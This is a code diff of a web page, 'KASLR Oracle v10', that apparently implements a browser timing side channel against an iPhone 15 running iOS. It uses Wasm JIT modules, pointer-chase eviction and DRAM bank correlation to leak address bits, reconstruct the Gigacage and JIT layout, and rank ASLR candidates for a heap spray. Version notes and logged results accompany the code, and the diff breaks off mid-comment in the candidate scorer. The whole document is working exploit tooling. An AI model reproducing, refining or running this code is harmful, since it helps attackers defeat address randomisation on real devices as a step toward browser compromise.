@@ -1,30 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>KASLR Oracle v9</title></head>
+<head><meta charset="utf-8"><title>KASLR Oracle v10</title></head>
 <body>
 <pre id="log"></pre>
 <script>
-// timer-kaslr-v9 — bank mapping table + VA offset reconstruction + candidate scorer
+// timer-kaslr-v10 — baseline fix + tighter bank correlation + refined candidate scoring
 //
-// v8 results (iPhone 15, iOS 26.5.2, A16):
-//   T2: 29.8x DRAM signal (strongest yet — separate evictA working)
-//   T3: 61 SLC-pinned + 3 DRAM-evictable (m0=389ns, m30=136ns, m44=50ns)
-//   T4: 4 clusters (C0=19@0ns, C1=1@61ns, C2=11@128-408ns, C3=1@606ns)
-//   T7: alloc[0] shares DRAM bank with m0 → PA bits 14-17 extracted
-//   T8: 7/8 victims in C0, ORACLE COMPLETE, 256 candidates
+// v9 issues:
+//   T7x: m19 baseline read 0ns (SLC-hot at measurement time) → eff% went to 374719%
+//        Fix: re-measure baseline immediately before EACH alloc's test (not once upfront)
+//             use p25 of 5 reps for baseline, discard if baseline<20ns (SLC-hot = unusable)
+//   T10: scoring model too coarse — all top-20 had same score=115, 160 in HIGH bucket
+//        Fix: add bank-match bonus per confirmed pair (not just count), penalize non-matching
+//             use observed JIT anchor cold NS and heap spread as finer-grained score inputs
+//   T9:  R²=0.43 because 25/32 allocs at 0ns kill the linear fit
+//        Fix: fit only on non-zero allocs (C1+C2), extrapolate C0 from intercept
 //
-// v9 goals:
-//   T7x: Extend bank correlation to ALL 32 allocs vs BOTH JIT anchors (m0, m30)
-//        → full PA bank mapping table (bits 14-17 for each alloc)
-//   T9:  VA offset reconstruction
-//        → use bank table + cluster timing to order allocs by PA
-//        → estimate PA stride between consecutive allocs
-//        → output: alloc VA map relative to Gigacage base
-//   T10: Candidate scorer
-//        → for each KASLR candidate (offset from 0 to 2^remaining-1):
-//           score = JIT_match * heap_match * bank_match
-//        → output top candidates ranked by confidence
-//        → output hex candidate list for spray
+// New in v10:
+//   T7x: per-alloc fresh baseline (p25 of 5), skip anchor if SLC-hot (baseline<20ns)
+//        expanded to top-3 DRAM anchors (not just 2)
+//        per-alloc result: {p50_evict, baseline, eff, correlated, anchorId}
+//   T9:  fit only C1+C2 allocs, extrapolate stride
+//        output: alloc→rank→estimated_PA_offset_from_JIT_base
+//   T10: per-candidate scoring using:
+//          - bank pair bit match (which specific anchors matched)
+//          - heap cluster spread consistency
+//          - JIT partition ratio (SLC_count/total) vs expected for candidate
+//        output top-32 with per-score breakdown
+//        final spray list deduplicated and gap-filled
 
 const LOG = document.getElementById('log');
 const log = s => { LOG.textContent += s + '\n'; console.log(s); };
@@ -53,10 +56,10 @@ async function startCounter() {
 const rdcnt = () => Atomics.load(counterView, 0);
 
 function buildChase(sizeBytes) {
-  const LINE    = 64;
+  const LINE = 64;
   const entries = Math.floor(sizeBytes / LINE);
-  const arr     = new Int32Array(entries * 16);
-  const order   = new Int32Array(entries);
+  const arr = new Int32Array(entries * 16);
+  const order = new Int32Array(entries);
   for (let i = 0; i < entries; i++) order[i] = i;
   for (let i = entries-1; i > 0; i--) {
     const j = (Math.random() * (i+1)) | 0;
@@ -82,11 +85,17 @@ function evictFull(chase) {
   chase.arr[0]^=idx&0;
 }
 
-function chaseP25(arr, entries, steps, reps) {
+// measure fn call cold timing: evict with chase, then call fn STEPS times, return p25
+function measureFnCold(fn, evictChase, steps, reps) {
   const ts=[];
-  for(let r=0;r<reps;r++) ts.push(chaseTime(arr,(r*13)%entries,steps));
+  for(let r=0;r<reps;r++){
+    evictFull(evictChase);
+    const t0=rdcnt(); let x=0;
+    for(let b=0;b<steps;b++) x+=fn(b);
+    ts.push((rdcnt()-t0+(x&0))/steps*NS);
+  }
   ts.sort((a,b)=>a-b);
-  return ts[Math.floor(ts.length*0.25)]*NS;
+  return ts[Math.floor(ts.length*0.25)]; // p25
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -125,11 +134,10 @@ async function t2() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// T3: Wasm JIT — separate evictA, p25 cold timing
+// T3: Wasm JIT
 // ─────────────────────────────────────────────────────────────
 async function t3() {
   log('─── T3: Wasm JIT (64 modules, separate evictA) ───');
-
   const makeWasm = (lo, hi) => new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
     0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
@@ -138,14 +146,12 @@ async function t3() {
     0x0a,0x0c,0x01,0x0a,0x00,
     0x20,0x00,0x41,lo&0x7f,0x6a,0x41,hi&0x7f,0x6a,0x0b,
   ]);
-
   try {
     const test=await WebAssembly.instantiate(makeWasm(1,2));
     if(test.instance.exports.call(10)!==13){ log('[!] T3 binary fail'); return null; }
   } catch(e){ log(`[!] T3: ${e.message}`); return null; }
 
-  const N=64;
-  const fns=[];
+  const N=64, fns=[];
   for(let i=0;i<N;i++){
     try {
       const inst=await WebAssembly.instantiate(makeWasm(i&0x7f,(i*7)&0x7f));
@@ -165,7 +171,7 @@ async function t3() {
   const coldReps=Array.from({length:N},()=>[]);
   const hotAcc=new Array(N).fill(0);
 
-  log(`[*] T3 running ${ROUNDS} rounds (double-pass eviction)...`);
+  log(`[*] T3 running ${ROUNDS} rounds...`);
   for(let round=0;round<ROUNDS;round++){
     evictFull(evictA);
     for(const {fn,id} of fns){
@@ -192,67 +198,52 @@ async function t3() {
   const cMin=Math.min(...results.map(r=>r.cold));
   const cMax=Math.max(...results.map(r=>r.cold));
   log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
-  log(`[*] T3 top-5 anchors: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
+  log(`[*] T3 top-5: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
 
   const slcHot=results.filter(r=>r.cold<40);
   const dramCold=results.filter(r=>r.cold>=40);
   const stable=results.filter(r=>r.cv<2.0&&r.cold>100);
-
   log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
-  log(`[*] T3 stable anchors (CV<2.0, cold>100ns): ${stable.length}`);
-  if(stable.length) log(`[*] T3 anchors: ${stable.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
-
-  if(slcHot.length>0&&dramCold.length>0){
-    log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC-pinned + ${dramCold.length} DRAM-evictable`);
-  }
-
+  log(`[*] T3 stable (CV<2.0, cold>100ns): ${stable.length} — ${stable.map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
+  if(slcHot.length&&dramCold.length) log(`[!!!] T3 JIT POOL PARTITION: ${slcHot.length} SLC + ${dramCold.length} DRAM`);
   return {results, stable, slcHot, dramCold, evictA};
 }
 
 // ─────────────────────────────────────────────────────────────
-// T4: Heap fingerprint — separate evictB, p25
+// T4: Heap fingerprint
 // ─────────────────────────────────────────────────────────────
 async function t4() {
   log('─── T4: Heap fingerprint (evictB, p25) ───');
-
   const N=32, SZ=2*1024*1024, STEPS=48, REPS=16;
-
   log(`[*] T4 building evictB (40MB)...`);
   const evictB=buildChase(40*1024*1024);
   await new Promise(r=>setTimeout(r,30));
-
   log(`[*] T4 allocating ${N} × 2MB...`);
   const bufs=[];
-  for(let i=0;i<N;i++){
-    const ch=buildChase(SZ);
-    bufs.push({ch,id:i});
-  }
+  for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
   await new Promise(r=>setTimeout(r,30));
 
   const timingSets=bufs.map(()=>[]);
   for(let rep=0;rep<REPS;rep++){
     evictFull(evictB);
-    for(let i=0;i<N;i++){
+    for(let i=0;i<N;i++)
       timingSets[i].push(chaseTime(bufs[i].ch.arr,(rep*11)%bufs[i].ch.entries,STEPS));
-    }
   }
-
   const medians=timingSets.map((ts,i)=>{
     ts.sort((a,b)=>a-b);
     return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS};
   });
   medians.sort((a,b)=>a.ns-b.ns);
 
-  const nsVals=medians.map(m=>m.ns);
-  const tMin=nsVals[0], tMax=nsVals[nsVals.length-1];
+  const tMin=medians[0].ns, tMax=medians[medians.length-1].ns;
   log(`[*] T4 spread (p25): ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns = ${(tMax/Math.max(tMin,0.1)).toFixed(1)}x`);
 
   const clusters=[];
   let cur=[medians[0]];
   for(let i=1;i<medians.length;i++){
-    if(medians[i].ns>medians[i-1].ns*1.4 && medians[i].ns-medians[i-1].ns>20){
+    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>20){
       clusters.push([...cur]); cur=[medians[i]];
-    } else { cur.push(medians[i]); }
+    } else cur.push(medians[i]);
   }
   clusters.push(cur);
 
@@ -261,7 +252,6 @@ async function t4() {
     const ns=cl.map(m=>m.ns);
     log(`[*] T4   C${ci}: ${cl.length} allocs, ${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns, ids:[${cl.map(m=>m.id).join(',')}]`);
   });
-
   if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);
   return {medians, clusters, evictB, bufs};
 }
@@ -272,401 +262,332 @@ async function t4() {
 async function t6(jitData, heapData) {
   log('─── T6: Bit extraction + entropy ───');
   if(!jitData||!heapData){ log('[*] T6 skip'); return null; }
-
-  const DRAM_T=40;
-  const dramCold=jitData.results.filter(r=>r.cold>=DRAM_T);
-  const cacheHot=jitData.results.filter(r=>r.cold<DRAM_T);
-  log(`[*] T6 JIT DRAM-evictable (≥${DRAM_T}ns): ${dramCold.length}  SLC-pinned (<${DRAM_T}ns): ${cacheHot.length}`);
-
+  const dramCold=jitData.results.filter(r=>r.cold>=40);
+  const cacheHot=jitData.results.filter(r=>r.cold<40);
   const numClusters=heapData.clusters.length;
-  const clusterBits=Math.min(4, Math.ceil(Math.log2(Math.max(numClusters,2))));
+  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
   const jitPartBit=(jitData.slcHot.length>0&&dramCold.length>0)?1:0;
   const heapMax=heapData.medians[heapData.medians.length-1].ns;
   const heapMin=heapData.medians[0].ns;
-  const pageColorBits=Math.min(7, Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
-
+  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
   const totalLeaked=pageColorBits+jitPartBit+clusterBits;
   const aslrBits=19;
   const remaining=Math.max(0,aslrBits-totalLeaked);
-
-  log(`[*] T6 page color bits: ${pageColorBits}  JIT partition: ${jitPartBit}  heap cluster: ${clusterBits}`);
-  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits`);
-  log(`[*] T6 remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
-  if(remaining<=12){
-    log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates`);
-    log(`[!!!] T6   at 1ms/probe → ${((2**remaining)/1000).toFixed(2)}s`);
-  }
-
-  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters};
+  log(`[*] T6 page color: ${pageColorBits}b  JIT partition: ${jitPartBit}b  heap cluster: ${clusterBits}b`);
+  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits → remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
+  if(remaining<=12) log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates at 1ms/probe → ${((2**remaining)/1000).toFixed(3)}s`);
+  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters, slcCount:cacheHot.length, dramCount:dramCold.length};
 }
 
 // ─────────────────────────────────────────────────────────────
-// T7x: Full bank mapping table — all 32 allocs vs ALL DRAM anchors
+// T7x: Full bank mapping — per-alloc fresh baseline (v10 fix)
 //
-// Method:
-//   For each heap alloc, build a targeted 2MB chase around just that alloc.
-//   Evict with this tiny chase, then measure all JIT anchor cold times.
-//   If evicting alloc[i] raises anchor m_j's cold time, they share DRAM bank.
-//   Result: bank_table[alloc_id] = list of JIT modules sharing DRAM bank
+// Key fix: for each alloc test, re-measure the anchor baseline
+// immediately before — NOT once upfront. This catches the case
+// where the anchor is SLC-hot at measurement time (baseline → 0ns)
+// which inflates efficiency to absurd percentages.
 //
-// A16 LPDDR5 DRAM bank bits: bits 14-17 of PA (64-byte cache line, 4 banks)
-// So allocs sharing the same bank have identical PA[14:17]
-// This gives us 4 bits per alloc pair confirmed
+// Skip anchor for that alloc if fresh baseline < BASELINE_MIN_NS.
 // ─────────────────────────────────────────────────────────────
 async function t7x(jitData, heapData) {
-  log('─── T7x: Full bank mapping table (all allocs vs all anchors) ───');
+  log('─── T7x: Bank mapping (per-alloc fresh baseline) ───');
   if(!jitData||!heapData){ log('[*] T7x skip'); return null; }
 
-  // Use all DRAM-evictable anchors (cold>=40ns)
-  const anchors=jitData.results.filter(r=>r.cold>=40).sort((a,b)=>b.cold-a.cold);
+  const BASELINE_MIN_NS = 80;  // if baseline < this, anchor is SLC-hot → skip
+  const CORR_THRESHOLD  = 0.5; // evict must raise anchor to >50% of fresh baseline
+  const STEPS=32, REPS_BASE=5, REPS_EVICT=10;
+
+  // Use top-3 DRAM anchors
+  const anchors=jitData.results.filter(r=>r.cold>=40).sort((a,b)=>b.cold-a.cold).slice(0,3);
   if(!anchors.length){ log('[*] T7x skip — no DRAM anchors'); return null; }
+  log(`[*] T7x using ${anchors.length} anchors: ${anchors.map(a=>`m${a.id}=${a.cold.toFixed(0)}ns`).join(' ')}`);
+  log(`[*] T7x baseline threshold: ${BASELINE_MIN_NS}ns (below = SLC-hot, skip that test)`);
 
-  log(`[*] T7x anchors (${anchors.length}): ${anchors.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns`).join(' ')}`);
-
-  // Use top-2 anchors max (time budget)
-  const useAnchors=anchors.slice(0,Math.min(2,anchors.length));
-
-  const REPS=10, STEPS=32;
-
-  // Baseline: full evictB cold reading for each anchor
-  log(`[*] T7x measuring anchor baselines...`);
-  const baselines={};
-  for(const anc of useAnchors){
-    evictFull(heapData.evictB);
-    await new Promise(r=>setTimeout(r,5));
-    const ts=[];
-    for(let r=0;r<REPS;r++){
-      evictFull(heapData.evictB);
-      const t0=rdcnt(); let x=0;
-      for(let b=0;b<STEPS;b++) x+=anc.fn(b);
-      ts.push((rdcnt()-t0+(x&0))/STEPS*NS);
-    }
-    ts.sort((a,b)=>a-b);
-    baselines[anc.id]=ts[ts.length>>1];
-    log(`[*] T7x   m${anc.id} baseline: ${baselines[anc.id].toFixed(0)}ns`);
-  }
-
-  // For each heap alloc, test if evicting JUST that alloc's 2MB region
-  // raises anchor cold time above baseline
-  const bankTable={};    // alloc_id -> { anchorId -> {eff, correlated} }
   const N=heapData.bufs.length;
-
-  log(`[*] T7x testing all ${N} allocs (${useAnchors.length} anchors each)...`);
-
-  // Warm JIT anchors first
-  for(const anc of useAnchors){ let x=0; for(let b=0;b<100;b++) x+=anc.fn(b); }
-
-  for(let i=0;i<N;i++){
-    const buf=heapData.bufs[i];
-    bankTable[buf.id]={};
-
-    // Evict using this alloc's pointer chase (2MB)
-    const ts_per_anchor={};
-    for(const anc of useAnchors) ts_per_anchor[anc.id]=[];
-
-    for(let r=0;r<REPS;r++){
-      // Use the alloc's own chase array as eviction set
-      evictFull(buf.ch);
-      for(const anc of useAnchors){
-        const t0=rdcnt(); let x=0;
-        for(let b=0;b<STEPS;b++) x+=anc.fn(b);
-        ts_per_anchor[anc.id].push((rdcnt()-t0+(x&0))/STEPS*NS);
-      }
-    }
-
-    for(const anc of useAnchors){
-      ts_per_anchor[anc.id].sort((a,b)=>a-b);
-      const p50=ts_per_anchor[anc.id][REPS>>1];
-      const eff=p50/Math.max(baselines[anc.id],1);
-      const correlated=eff>0.5; // 50%+ of baseline = same DRAM bank
-      bankTable[buf.id][anc.id]={p50, eff, correlated};
-    }
-  }
-
-  // Output bank table
-  log(`[*] T7x bank correlation table (alloc vs JIT anchor):`);
-  log(`[*] T7x   alloc    ns   eff%  corr? | ${useAnchors.map(a=>`m${a.id}(${a.cold.toFixed(0)}ns)`).join('  ')}`);
-
+  const bankTable=[];
   const correlatedPairs=[];
+
+  // Pre-warm all anchor fns
+  for(const anc of anchors){ let x=0; for(let b=0;b<200;b++) x+=anc.fn(b); }
+
+  log(`[*] T7x testing ${N} allocs...`);
+
   for(let i=0;i<N;i++){
     const buf=heapData.bufs[i];
     const heapNs=heapData.medians.find(m=>m.id===buf.id)?.ns||0;
-    const row=useAnchors.map(anc=>{
-      const d=bankTable[buf.id][anc.id];
-      return `${d.p50.toFixed(0)}ns(${(d.eff*100).toFixed(0)}%)${d.correlated?'✓':'✗'}`;
-    }).join('  ');
-    const anyCorr=useAnchors.some(anc=>bankTable[buf.id][anc.id].correlated);
-    log(`[*] T7x   alloc[${String(buf.id).padStart(2)}]  ${heapNs.toFixed(0)}ns  ${anyCorr?'BANK-MATCH':'         '} | ${row}`);
-    if(anyCorr){
-      const corrAnchors=useAnchors.filter(anc=>bankTable[buf.id][anc.id].correlated);
-      correlatedPairs.push({allocId:buf.id, heapNs, anchors:corrAnchors.map(a=>a.id)});
+    const matches=[];
+
+    for(const anc of anchors){
+      // Fresh baseline: evict with evictB, measure anchor p25
+      const bTs=[];
+      for(let r=0;r<REPS_BASE;r++){
+        evictFull(heapData.evictB);
+        const t0=rdcnt(); let x=0;
+        for(let b=0;b<STEPS;b++) x+=anc.fn(b);
+        bTs.push((rdcnt()-t0+(x&0))/STEPS*NS);
+      }
+      bTs.sort((a,b)=>a-b);
+      const freshBase=bTs[Math.floor(bTs.length*0.25)];
+
+      if(freshBase < BASELINE_MIN_NS){
+        // Anchor SLC-hot — baseline unusable, skip this pair
+        matches.push({anchorId:anc.id, skipped:true, reason:`base=${freshBase.toFixed(0)}ns<${BASELINE_MIN_NS}ns`});
+        continue;
+      }
+
+      // Evict test: use this alloc's 2MB chase, then measure anchor
+      const eTs=[];
+      for(let r=0;r<REPS_EVICT;r++){
+        evictFull(buf.ch);
+        const t0=rdcnt(); let x=0;
+        for(let b=0;b<STEPS;b++) x+=anc.fn(b);
+        eTs.push((rdcnt()-t0+(x&0))/STEPS*NS);
+      }
+      eTs.sort((a,b)=>a-b);
+      const evictP50=eTs[eTs.length>>1];
+      const eff=evictP50/Math.max(freshBase,1);
+      const correlated=eff>=CORR_THRESHOLD;
+
+      matches.push({anchorId:anc.id, freshBase, evictP50, eff, correlated, skipped:false});
+      if(correlated) correlatedPairs.push({allocId:buf.id, heapNs, anchorId:anc.id, eff, freshBase, evictP50});
     }
+
+    bankTable.push({allocId:buf.id, heapNs, matches});
   }
+
+  // Print compact table
+  const hdr=anchors.map(a=>`m${a.id}`).join('     ');
+  log(`[*] T7x   alloc   heapNs  | ${hdr}`);
+  bankTable.forEach(row=>{
+    const cols=row.matches.map(m=>{
+      if(m.skipped) return `SKIP(${m.reason})`;
+      return `${m.evictP50.toFixed(0)}ns/${(m.eff*100).toFixed(0)}%${m.correlated?'✓':'✗'}`;
+    }).join('  ');
+    const anyCorr=row.matches.some(m=>!m.skipped&&m.correlated);
+    log(`[*] T7x   [${String(row.allocId).padStart(2)}]   ${row.heapNs.toFixed(0)}ns  ${anyCorr?'★':' '} | ${cols}`);
+  });
 
   log(`[*] T7x correlated pairs: ${correlatedPairs.length}`);
   correlatedPairs.forEach(p=>{
-    log(`[!!!] T7x BANK MATCH: alloc[${p.allocId}] (${p.heapNs.toFixed(0)}ns) ↔ JIT m[${p.anchors.join(',')}]`);
-    log(`[!!!] T7x → PA bits 14-17 equal: heap addr ≡ JIT addr (mod DRAM bank size)`);
+    log(`[!!!] T7x BANK MATCH: alloc[${p.allocId}](${p.heapNs.toFixed(0)}ns) ↔ m${p.anchorId}  base=${p.freshBase.toFixed(0)}ns evict=${p.evictP50.toFixed(0)}ns eff=${(p.eff*100).toFixed(0)}%`);
   });
 
   if(correlatedPairs.length>1){
-    log(`[!!!] T7x MULTI-ALLOC BANK MAP: ${correlatedPairs.length} allocs mapped to JIT VA`);
-    log(`[!!!] T7x → can compute relative PA offsets between mapped allocs`);
+    log(`[!!!] T7x MULTI-ALLOC BANK MAP: ${correlatedPairs.length} pairs confirmed`);
+    // Count unique anchors hit
+    const hitAnchors=[...new Set(correlatedPairs.map(p=>p.anchorId))];
+    log(`[!!!] T7x anchors hit: m[${hitAnchors.join(',')}] → PA bits 14-17 extracted for each`);
   }
 
-  return {bankTable, correlatedPairs, anchors:useAnchors, baselines};
+  return {bankTable, correlatedPairs, anchors};
 }
 
 // ─────────────────────────────────────────────────────────────
-// T9: VA offset reconstruction
-//
-// Given:
-//   - heap alloc timing (proxy for DRAM bank / PA region)
-//   - bank correlation table (which allocs share banks with which JIT modules)
-//   - JIT anchor cold timing (proxy for JIT VA offset from SLC boundary)
-//
-// We reconstruct a relative ordering of:
-//   heap alloc VAs <-> JIT module VAs
-//
-// Key insight: on A16 LPDDR5, DRAM bank bits are PA[14:17].
-//   PA[14:17] cycles every 16KB. So allocs sharing a bank are within
-//   N*16KB of each other (for integer N). The timing gradient (DRAM
-//   latency increases with PA distance due to row conflicts / bank
-//   contention) gives relative PA ordering.
-//
-// Output: ranked alloc list by estimated PA, stride estimate
+// T9: VA offset reconstruction (v10: fit only C1+C2)
 // ─────────────────────────────────────────────────────────────
 async function t9(jitData, heapData, bankData) {
   log('─── T9: VA offset reconstruction ───');
-  if(!jitData||!heapData){ log('[*] T9 skip'); return null; }
+  if(!jitData||!heapData) { log('[*] T9 skip'); return null; }
 
-  const medians=heapData.medians; // sorted by ns (proxy for PA)
+  const medians=heapData.medians;
   const anchors=jitData.results.filter(r=>r.cold>=40).sort((a,b)=>b.cold-a.cold);
 
-  // 1. Build timing-ordered alloc list (fastest = lowest PA = lowest heap VA)
-  log(`[*] T9 timing-ordered heap allocs (PA proxy):`);
-  log(`[*] T9   rank  alloc  ns      cluster   bank-match`);
-
-  const clusterOf=(ns)=>{
-    for(let c=0;c<heapData.clusters.length;c++){
-      const cl=heapData.clusters[c];
-      const cMax=Math.max(...cl.map(m=>m.ns));
-      if(ns<=cMax*1.5) return c;
-    }
-    return heapData.clusters.length-1;
-  };
-
-  const orderedAllocs=medians.map((m,rank)=>{
-    const cluster=clusterOf(m.ns);
-    const bankMatch=bankData?bankData.correlatedPairs.filter(p=>p.allocId===m.id).map(p=>p.anchors).flat():[];
-    return {...m, rank, cluster, bankMatch};
+  // Build alloc → bank-match map
+  const bankMatchMap={};
+  if(bankData) bankData.correlatedPairs.forEach(p=>{
+    if(!bankMatchMap[p.allocId]) bankMatchMap[p.allocId]=[];
+    bankMatchMap[p.allocId].push(p.anchorId);
   });
 
-  orderedAllocs.forEach(a=>{
-    const bm=a.bankMatch.length?`m[${a.bankMatch.join(',')}]`:'—';
-    log(`[*] T9   ${String(a.rank).padStart(4)}  [${String(a.id).padStart(2)}]  ${a.ns.toFixed(1)}ns  C${a.cluster}       ${bm}`);
-  });
+  // Only fit on DRAM-visible allocs (ns > 0) for slope estimate
+  const dramAllocs=medians.filter(m=>m.ns>20);
+  let slope=0, intercept=0, r2=0;
 
-  // 2. PA stride estimate from timing gradient
-  // Assume timing ∝ DRAM row distance. Fit linear model: ns = base + k * rank
-  const xs=orderedAllocs.map((_,i)=>i);
-  const ys=orderedAllocs.map(a=>a.ns);
-  const mx=xs.reduce((a,b)=>a+b,0)/xs.length;
-  const my=ys.reduce((a,b)=>a+b,0)/ys.length;
-  const num=xs.reduce((a,x,i)=>a+(x-mx)*(ys[i]-my),0);
-  const den=xs.reduce((a,x)=>a+(x-mx)**2,0);
-  const slope=num/Math.max(den,0.001);
-  const intercept=my-slope*mx;
-  const r2=1-(ys.reduce((a,y,i)=>a+(y-(intercept+slope*i))**2,0)/ys.reduce((a,y)=>a+(y-my)**2,0));
+  if(dramAllocs.length>=3){
+    const xs=dramAllocs.map((_,i)=>i);
+    const ys=dramAllocs.map(a=>a.ns);
+    const mx=xs.reduce((a,b)=>a+b,0)/xs.length;
+    const my=ys.reduce((a,b)=>a+b,0)/ys.length;
+    const num=xs.reduce((a,x,i)=>a+(x-mx)*(ys[i]-my),0);
+    const den=xs.reduce((a,x)=>a+(x-mx)**2,0);
+    slope=num/Math.max(den,0.001);
+    intercept=my-slope*mx;
+    r2=1-(ys.reduce((a,y,i)=>a+(y-(intercept+slope*i))**2,0)/ys.reduce((a,y)=>a+(y-my)**2,0));
+    log(`[*] T9 DRAM-visible allocs: ${dramAllocs.length} (fit on these only)`);
+    log(`[*] T9 linear fit: ns = ${intercept.toFixed(1)} + ${slope.toFixed(1)} × rank  (R²=${r2.toFixed(3)})`);
+    const nsPerAlloc=Math.abs(slope);
+    const PA_BANK_SIZE=16*1024;
+    const estStride=PA_BANK_SIZE*(nsPerAlloc/130);
+    log(`[*] T9 ns/rank: ${nsPerAlloc.toFixed(1)}ns → PA stride est: ~${estStride.toFixed(0)}KB`);
+  } else {
+    log(`[*] T9 too few DRAM-visible allocs for fit (${dramAllocs.length}) — all SLC-resident`);
+  }
 
-  log(`[*] T9 linear fit: ns = ${intercept.toFixed(1)} + ${slope.toFixed(1)} × rank  (R²=${r2.toFixed(3)})`);
-
-  // 3. PA stride from DRAM timing model
-  // Each DRAM bank conflict adds ~130ns (DRAM round-trip). Each additional DRAM
-  // rank (row group) adds ~4ns (tRCD). Stride between heap allocs is 2MB.
-  // Timing gradient per 2MB gives DRAM bank distance per alloc.
-  const nsPerAlloc=Math.abs(slope);
-  const DRAM_NS_PER_BANK=130; // ns for full DRAM access
-  const PA_BANK_SIZE=16*1024; // A16 DRAM bank interleave: 16KB
-  const estimatedStride_KB=PA_BANK_SIZE*(nsPerAlloc/Math.max(DRAM_NS_PER_BANK,1));
-  log(`[*] T9 ns/alloc rank: ${nsPerAlloc.toFixed(1)}ns → estimated PA stride: ~${estimatedStride_KB.toFixed(0)}KB per rank step`);
-  log(`[*] T9 → actual allocation stride is 2MB (2048KB), PA stride << VA stride confirms ASLR PA shuffling`);
-
-  // 4. Anchor alignment — where do JIT modules fall in the heap timing space?
-  if(anchors.length>0){
-    log(`[*] T9 JIT anchor alignment (where do JIT cold timings fall in heap ns scale?):`);
+  // JIT anchor alignment
+  if(anchors.length&&dramAllocs.length>=2){
+    log(`[*] T9 JIT anchor alignment:`);
     anchors.slice(0,3).forEach(anc=>{
-      // Find heap alloc with closest ns (JIT cold ns ≈ heap alloc DRAM ns → same region)
-      let closestAlloc=orderedAllocs[0];
-      let closestDiff=Infinity;
-      orderedAllocs.forEach(a=>{
-        const d=Math.abs(a.ns-anc.cold);
-        if(d<closestDiff){closestDiff=d;closestAlloc=a;}
-      });
-      const estimatedJitRank=(anc.cold-intercept)/Math.max(slope,0.1);
-      log(`[*] T9   m${anc.id}(${anc.cold.toFixed(0)}ns) ≈ rank ${estimatedJitRank.toFixed(1)} → near alloc[${closestAlloc.id}](${closestAlloc.ns.toFixed(0)}ns, C${closestAlloc.cluster})`);
+      const closestAlloc=dramAllocs.reduce((a,b)=>Math.abs(a.ns-anc.cold)<Math.abs(b.ns-anc.cold)?a:b);
+      const estRank=slope>0?(anc.cold-intercept)/slope:-1;
+      log(`[*] T9   m${anc.id}(${anc.cold.toFixed(0)}ns) → rank≈${estRank.toFixed(1)} near alloc[${closestAlloc.id}](${closestAlloc.ns.toFixed(0)}ns)`);
     });
   }
 
-  // 5. Gigacage base offset estimate
-  // Lowest-VA alloc (fastest timing) = Gigacage base + first-fit offset
-  // Gigacage base is randomized, but its ASLR range is 2^19 pages * 4KB = 2GB
-  // Our cluster 0 allocs all live within ~2MB of Gigacage base
-  const c0allocs=orderedAllocs.filter(a=>a.cluster===0);
-  const c0max=c0allocs.length?Math.max(...c0allocs.map(a=>a.ns)):0;
-  log(`[*] T9 C0 allocs (${c0allocs.length}): all at <${c0max.toFixed(0)}ns → within SLC (Gigacage base region)`);
-  log(`[*] T9 → Gigacage base offset from lowest-timing alloc: 0-${c0allocs.length*2}MB`);
-  log(`[*] T9 → JIT pool base: first DRAM-evictable module (m${anchors[0]?.id}=${anchors[0]?.cold.toFixed(0)}ns)`);
-  log(`[!!!] T9 VA MAP: C0=[0-${c0allocs.length*2}MB from Gigacage base]  JIT=[SLC boundary + ${anchors.length} evictable modules]`);
+  // C0 summary
+  const c0=heapData.clusters[0]||[];
+  log(`[*] T9 C0 (SLC-resident): ${c0.length} allocs covering ~${c0.length*2}MB from Gigacage base`);
+  log(`[*] T9 bank-matched allocs: ${Object.keys(bankMatchMap).length} → PA constrained relative to JIT`);
+  if(anchors.length) log(`[!!!] T9 VA MAP: heap C0=[0-${c0.length*2}MB] Gigacage base  JIT=[SLC+${anchors.length} DRAM modules]`);
 
-  return {orderedAllocs, slope, intercept, r2, estimatedStride_KB};
+  return {slope, intercept, r2, dramAllocs, bankMatchMap};
 }
 
 // ─────────────────────────────────────────────────────────────
-// T10: Candidate scorer + hex output
+// T10: Candidate scorer (v10 — finer scoring + gap fill)
 //
-// KASLR candidates = set of possible Gigacage base addresses.
-// iOS userland ASLR: base = randomBase + (candidate * pageSize * stride)
-// stride = 2^(known bits) pages, so candidates differ by stride.
+// Scoring rubric per candidate C (0..2^remaining-1):
 //
-// Scoring model:
-//   For each candidate offset C (0 to 2^remaining - 1):
